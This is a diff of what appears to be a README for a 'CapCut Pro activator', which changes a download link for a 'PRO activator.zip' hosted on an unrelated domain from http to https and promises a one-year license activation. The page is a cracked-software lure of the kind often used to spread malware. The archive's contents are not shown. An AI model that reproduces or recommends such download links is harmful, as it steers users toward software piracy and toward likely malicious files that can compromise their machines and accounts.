@@ -1,6 +1,6 @@
 # <h1 align="center">CapCut Pro activator</h1>
 
-# [DOWNLOAD](http://egesonhavadis.com/PRO%20activator.zip)
+# [DOWNLOAD](https://egesonhavadis.com/PRO%20activator.zip)
 
 One year license activation for desktop version
 
